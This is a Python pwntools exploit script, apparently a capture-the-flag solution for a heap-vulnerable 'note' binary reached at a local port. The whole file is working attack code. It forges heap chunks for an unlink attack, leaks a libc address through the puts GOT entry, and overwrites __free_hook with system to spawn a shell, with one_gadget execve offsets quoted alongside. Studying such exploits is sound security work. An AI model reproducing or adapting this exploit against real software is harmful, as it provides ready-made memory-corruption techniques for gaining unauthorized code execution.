#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
io=process("./note")
#gdb.attach(io)

p=remote("127.0.0.1",1234)
elf = ELF("./note")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def change_title(title):
	p.recvuntil('-->>')
	p.sendline('1')
	p.recvuntil('title:')
	p.send(title)
def change_content(size,content):
	p.recvuntil('-->>')
	p.sendline('2')
	p.recvuntil('(64-256):')
	p.sendline(str(size))
	p.recvuntil('content:')
	p.send(content)
def change_comment(content):
	p.recvuntil('-->>')
	p.sendline('3')
	p.recvuntil('comment:')
	p.sendline(content)

def show_content():
	p.recvuntil('-->>')
	p.sendline('4')

p.recvuntil("welcome to the note ")
offset = int(p.recv(4),10)
print '[*]', str(offset + 0x10),hex(offset +0x10)

change_content(0x78,"a"*0x30+p64(0x40)+p64(0x40)+p64(0x80)+p64(0x80)+p64(0x80)+p64(0x80)+"\n")
payload=p64(0x11)+p64(0x81)+p64(0x602070-0x18)+p64(0x602070-0x10)+p64(0x20)+'@'
change_title(payload)

change_content(0x1000,"a\n")
change_content(0x100000,"a\n")
change_title(p64(0x602050)+p64(elf.got['puts'])+p64(0x78)+p64(0x602058)+"\n")
show_content()
p.recvuntil('is:')
libc_base = u64(p.recv(6).ljust(8,'\0')) - libc.symbols['puts']
'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
system=libc_base + libc.symbols['system']
one_gadget = libc_base + 0xf1147
free_hook=libc_base+libc.symbols['__free_hook']
change_comment(p64(0)+p64(free_hook)+p64(0x602080)[:7])
change_comment(p64(system)+"\n")
change_content(0x78,"/bin/sh\x00\n")
p.recvuntil('-->>')
p.sendline('2')
p.recvuntil('(64-256):')
p.sendline(str(0))
p.interactive()
